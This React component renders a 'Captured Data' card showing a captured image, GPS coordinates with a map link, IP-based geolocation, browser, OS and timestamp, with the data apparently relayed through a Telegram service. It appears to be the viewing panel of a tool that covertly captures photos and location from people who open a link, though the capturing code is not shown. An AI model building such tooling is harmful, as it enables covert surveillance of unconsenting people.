"use client"

import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { MapPin, Globe, Monitor, Calendar, Flag } from "lucide-react"
import { CaptureData } from "@/services/telegram"
import { useState, useEffect } from "react"

interface CaptureDataDisplayProps {
  data: CaptureData
}

interface LocationData {
  country: string
  city: string
  region: string
  flag: string
}

export function CaptureDataDisplay({ data }: CaptureDataDisplayProps) {
  const { deviceInfo, location, image } = data
  const [locationData, setLocationData] = useState<LocationData | null>(null)
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    const fetchLocationData = async () => {
      try {
        const response = await fetch(`https://ipapi.co/${deviceInfo.ip}/json/`)
        if (!response.ok) throw new Error('Failed to fetch location data')
        const data = await response.json()
        setLocationData({
          country: data.country_name || "Unknown",
          city: data.city || "Unknown",
          region: data.region || "Unknown",
          flag: (data.country_code || "xx").toLowerCase()
        })
      } catch (error) {
        console.error('Error fetching location data:', error)
        setLocationData({
          country: "Unknown",
          city: "Unknown",
          region: "Unknown",
          flag: "xx"
        })
      } finally {
        setLoading(false)
      }
    }

    if (deviceInfo?.ip) {
      fetchLocationData()
    } else {
      setLoading(false)
    }
  }, [deviceInfo?.ip])

  const formatDate = (dateString: string) => {
    try {
      return new Date(dateString).toLocaleString()
    } catch (error) {
      return "Unknown date"
    }
  }

  if (loading) {
    return (
      <Card className="bg-gray-900/50 backdrop-blur-sm border-gray-800">
        <CardContent className="p-6">
          <p className="text-gray-400">Loading data...</p>
        </CardContent>
      </Card>
    )
  }

  return (
    <Card className="bg-gray-900/50 backdrop-blur-sm border-gray-800">
      <CardHeader>
        <CardTitle className="text-xl gradient-text">Captured Data</CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        {/* Image */}
        {image && (
          <div className="relative aspect-video rounded-lg overflow-hidden">
            <img
              src={image}
              alt="Captured image"
              className="w-full h-full object-cover"
              onError={(e) => {
                e.currentTarget.src = '/placeholder-image.jpg'
              }}
            />
          </div>
        )}

        {/* Location */}
        <div className="space-y-2">
          <div className="flex items-center gap-2">
            <MapPin className="h-5 w-5 text-red-400" />
            <h3 className="font-semibold">Location</h3>
          </div>
          <div className="pl-7 space-y-1">
            {locationData && (
              <div className="flex items-center gap-2 mb-2">
                <img
                  src={`https://flagcdn.com/w20/${locationData.flag}.png`}
                  alt={locationData.country}
                  className="w-5 h-3"
                />
                <span className="text-sm text-gray-400">
                  {locationData.city}, {locationData.region}, {locationData.country}
                </span>
              </div>
            )}
            <p className="text-sm text-gray-400">
              Latitude: {location?.latitude || "Unknown"}
            </p>
            <p className="text-sm text-gray-400">
              Longitude: {location?.longitude || "Unknown"}
            </p>
            {location?.latitude && location?.longitude && (
              <div className="mt-2">
                <a
                  href={`https://www.google.com/maps?q=${location.latitude},${location.longitude}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-blue-400 hover:text-blue-300 text-sm"
                >
                  View on Google Maps
                </a>
              </div>
            )}
          </div>
        </div>

        {/* Device Info */}
        <div className="space-y-2">
          <div className="flex items-center gap-2">
            <Monitor className="h-5 w-5 text-red-400" />
            <h3 className="font-semibold">Device Information</h3>
          </div>
          <div className="pl-7 space-y-1">
            <p className="text-sm text-gray-400">
              IP: {deviceInfo?.ip || "Unknown"}
            </p>
            <p className="text-sm text-gray-400">
              Browser: {deviceInfo?.browser || "Unknown"}
            </p>
            <p className="text-sm text-gray-400">
              OS: {deviceInfo?.os || "Unknown"}
            </p>
          </div>
        </div>

        {/* Timestamp */}
        <div className="flex items-center gap-2 text-sm text-gray-400">
          <Calendar className="h-4 w-4" />
          <span>{deviceInfo?.timestamp ? formatDate(deviceInfo.timestamp) : "Unknown"}</span>
        </div>
      </CardContent>
    </Card>
  )
} 